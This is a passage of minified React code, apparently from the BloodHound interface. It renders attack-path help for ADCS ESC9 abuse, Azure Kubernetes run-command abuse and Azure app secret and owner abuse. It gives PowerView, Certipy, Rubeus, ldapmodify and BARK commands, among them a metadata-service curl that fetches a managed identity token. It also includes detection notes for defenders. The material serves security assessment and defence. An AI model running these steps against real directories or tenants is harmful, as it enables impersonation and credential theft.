",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," ","contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have ",e.jsx("em",{children:'"Subject Require Email"'})," or"," ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim’s mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using PowerView:"]}),e.jsx(t,{component:"pre",children:"Get-DomainObject -Identity VICTIM -Properties mail"}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}"})]}),i=e.jsxs(l,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 3: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step.",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),"). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),").",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a user, you have the following options for obtaining the credentials:"]}),e.jsxs(B,{sx:{fontSize:"12px"},children:[e.jsxs(P,{children:["Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),")"]}),e.jsxs(P,{children:["Password reset (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/force-change-password",children:"ForceChangePassword edge documentation"}),")"]}),e.jsxs(P,{children:["Targeted Kerberoasting (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/write-spn",children:"WriteSPN edge documentation"}),")"]})]})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certify (2.0) as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca SERVER\\CA-NAME --template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Set UPN of victim to arbitrary value.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}"})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: "}),"Perform Kerberos authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the target identity to impersonate and the PFX-formatted certificate obtained in Step 4:"]}),e.jsx(t,{component:"pre",children:"Rubeus.exe asktgt /certificate:<cert base64> /user:TARGET /domain:DOMAIN /dc:DOMAIN_CONTROLLER"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d]})},io={general:to,windowsAbuse:oo,linuxAbuse:ro,opsec:no,references:ao,composition:eo},so=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},co=({sourceName:r,sourceType:a})=>{const o=J();return e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:[E(a,r)," has the privileges to perform the ADCS ESC9 Scenario B attack against the target domain.",e.jsx("br",{}),e.jsx("br",{}),"The principal has control over a victim computer with permission to enroll on one or more certificate templates, configured to: 1) enable certificate authentication, 2) require the ",e.jsx("code",{children:"dNSHostName"})," of the enrollee included in the Subject Alternative Name (SAN), and 3) not have the security extension enabled. The victim computer also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow weak certificate binding enforcement. This setup lets the principal impersonate any AD forest computer without their credentials.",e.jsx("br",{}),e.jsx("br",{}),"The attacker principal can abuse their control over the victim computer to modify the victim computer's"," ",e.jsx("code",{children:"dNSHostName"})," attribute to match the ",e.jsx("code",{children:"dNSHostName"})," of a targeted computer. The attacker principal will then abuse their control over the victim computer to obtain the credentials of the victim computer, or a session as the victim computer, and enroll a certificate as the victim in one of the affected certificate templates. The ",e.jsx("code",{children:"dNSHostName"})," of the victim will be included in the issued certificate under SAN DNS name. As the certificate template does not have the security extension, the issued certificate will NOT include the SID of the victim computer. DCs with strong certificate binding configuration will require a SID to be present in a certificate used for Kerberos authentication, but the affected DCs with weak certificate binding configuration will not. The affected DCs will split the SAN DNS name into a computer name and a domain name, confirm that the domain name is correct, and use the computer name appended a $ to identify principals with a matching"," ",e.jsx("code",{children:"sAMAccountName"}),". At last, the DC issues a Kerberos TGT as the targeted computer to the attacker, which means the attacker now has a session as the targeted computer."]})})},lo=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Remove SPNs including ",e.jsx("code",{children:"dNSHostName"})," on victim.",e.jsx("br",{}),e.jsx("br",{}),"The SPNs of the victim will be automatically updated when you change the ",e.jsx("code",{children:"dNSHostName"}),". AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's ",e.jsx("code",{children:"dNSHostName"}),". Remove SPN entries using ldapmodify:"]}),e.jsx(t,{component:"pre",children:'echo -e "dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Set ",e.jsx("code",{children:"dNSHostName"})," of victim computer to targeted computer's"," ",e.jsx("code",{children:"dNSHostName"}),".",e.jsx("br",{}),e.jsx("br",{}),"Set the ",e.jsx("code",{children:"dNSHostName"})," of the victim computer using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL"})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 3: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have ",e.jsx("em",{children:'"Subject Require Email"'})," ","or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target computer why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using ldapsearch:"]}),e.jsx(t,{component:"pre",children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "VICTIM-DN" mail`}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not have the mail attribute set, set it to a dummy mail using ldapmodify:"]}),e.jsx(t,{component:"pre",children:`echo -e "dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`})]}),s=e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),")"]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted computer."})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 6 (Optional): "}),"Set ",e.jsx("code",{children:"dNSHostName"})," and SPN of victim to the previous values.",e.jsx("br",{}),e.jsx("br",{}),"To avoid issues in the environment, set the ",e.jsx("code",{children:"dNSHostName"})," and SPN of the victim computer back to its previous values using Certipy and ldapmodify:"]}),e.jsx(t,{component:"pre",children:"certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL"}),e.jsx(t,{component:"pre",children:'echo -e "dn: VICTIM-DN\\nchangetype: modify\\nadd: servicePrincipalName\\nservicePrincipalName: SPN" | ldapmodify -x -D "ATTACKER-DN" -w PWD -h DOMAIN-DNS-NAME'})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7: "}),"Perform Kerberos authentication as targeted computer against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx TARGET.pfx -dc-ip IP"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d,h]})},ho=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the computer that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),po=()=>{const r=[{label:"Certipy 4.0",link:"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"},{label:"Certified Pre-Owned",link:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"GhostPack Certipy",link:"https://github.com/GhostPack/Certify"},{label:"GhostPack Rubeus",link:"https://github.com/GhostPack/Rubeus"},{label:"Set-DomainObject",link:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject"},{label:"CertUtil.exe",link:"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil"},{label:"LDAPSearch",link:"https://linux.die.net/man/1/ldapsearch"},{label:"LDAPModify",link:"https://linux.die.net/man/1/ldapmodify"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},uo=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Remove SPNs including ",e.jsx("code",{children:"dNSHostName"})," on victim.",e.jsx("br",{}),e.jsx("br",{}),"The SPNs of the victim will be automatically updated when you change the ",e.jsx("code",{children:"dNSHostName"}),". AD will not allow the same SPN entry to be set on two accounts. Therefore, you must remove any SPN on the victim account that includes the victim's ",e.jsx("code",{children:"dNSHostName"}),". Set SPN of the victim computer using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}"})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Set ",e.jsx("code",{children:"dNSHostName"})," of victim computer to targeted computer's"," ",e.jsx("code",{children:"dNSHostName."}),e.jsx("br",{}),e.jsx("br",{}),"Set the ",e.jsx("code",{children:"dNSHostName"})," of the victim computer using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='target.corp.local'}"})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 3: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their ",e.jsx("code",{children:"mail"})," ","attribute set for the certificate enrollment. The CertTemplate BloodHound node will have"," ",e.jsx("em",{children:'"Subject Require Email"'})," or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target computer why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using PowerView:"]}),e.jsx(t,{component:"pre",children:"Get-DomainObject -Identity VICTIM -Properties mail"}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 4.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not have the mail attribute set, set it to a dummy mail using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}"})]}),s=e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 4: "}),"Obtain a session as victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step. You can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),")."]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certify (2.0) as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca SERVER\\CA-NAME --template TEMPLATE --machine"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 6 (Optional): "}),"Set ",e.jsx("code",{children:"dNSHostName"})," and SPN of victim to the previous values.",e.jsx("br",{}),e.jsx("br",{}),"To avoid issues in the environment, set the ",e.jsx("code",{children:"dNSHostName"})," and SPN of the victim computer back to its previous values using PowerView:"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}"})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 7: "}),"Perform Kerberos authentication as targeted computer against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 5:"]}),e.jsx(t,{component:"pre",children:"Rubeus.exe asktgt /certificate:<cert base64> /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps."}),a,o,i,s,c,d,h]})},mo={general:co,windowsAbuse:uo,linuxAbuse:lo,opsec:ho,references:po,composition:so},bo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:`Now you can use BARK's Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple "whoami" command:`}),e.jsx(t,{component:"pre",children:'Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n    -Command "whoami"'}),e.jsx(t,{variant:"body2",children:"If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),e.jsx(t,{component:"pre",children:`Invoke-AzureRMAKSRunCommand \`
    -Token $ARMToken \`
    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" \`
    -Command 'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"'`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),fo=()=>e.jsx(t,{variant:"body2",children:"The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster."}),yo=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),go=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]}),xo={general:fo,abuse:bo,opsec:yo,references:go},jo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Via the Azure portal:"}),e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"Find the group in your tenant (Azure Active Directory -> Groups -> Find Group in list)"})}),e.jsx(P,{children:e.jsx(M,{children:"Click the group from the list"})}),e.jsx(P,{children:e.jsx(M,{children:'In the left pane, click "Members"'})}),e.jsx(P,{children:e.jsx(M,{children:'At the top, click "Add members"'})}),e.jsx(P,{children:e.jsx(M,{children:'Find the principals you want to add to the group and click them, then click "select" at the bottom'})}),e.jsx(P,{children:e.jsx(M,{children:'You should see a message in the top right saying "Member successfully added"'})})]}),e.jsx(t,{variant:"body2",children:"Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]"})]}),wo=()=>e.jsx(t,{variant:"body2",children:"The ability to add other principals to an Azure security group"}),vo=()=>e.jsx(t,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."}),Ao=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview",children:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview"})]}),So={general:wo,abuse:jo,opsec:vo,references:Ao},Co=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),e.jsx(t,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),ko=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when an Azure principal has one of the following Azure Active Directory roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"Hybrid Identity Administrator"})}),e.jsx(P,{children:e.jsx(M,{children:"Partner Tier1 Support"})}),e.jsx(P,{children:e.jsx(M,{children:"Partner Tier2 Support"})}),e.jsx(P,{children:e.jsx(M,{children:"Directory Synchronization Accounts"})})]})}),e.jsx(t,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal or any API."})]}),To=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),Po=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),Do={general:ko,abuse:Co,opsec:To,references:Po},Oo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsxs(t,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),e.jsxs(t,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",e.jsx(t,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),e.jsxs(t,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),e.jsxs(t,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),Ro=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Azure provides several systems and mechanisms for granting control of securable objects within Azure Active Directory, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions."}),e.jsx(t,{variant:"body2",children:'When a principal has been granted "Cloud App Admin" or "App Admin" against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. Additionally, a principal that has been granted "Cloud App Admin" or "App Admin" against, or explicit ownership of a Service Principal or App Registration gains the ability to add secrets to that particular object.'})]}),Eo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),Io=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),$o={general:Ro,abuse:Oo,opsec:Eo,references:Io},Go=()=>e.jsx(t,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),No=()=>e.jsx(t,{variant:"body2",children:"Principals with the Application Admin role can control tenant-resident apps."}),Mo=()=>e.jsx(t,{variant:"body2",children:"The Azure portal will create a log even whenever a 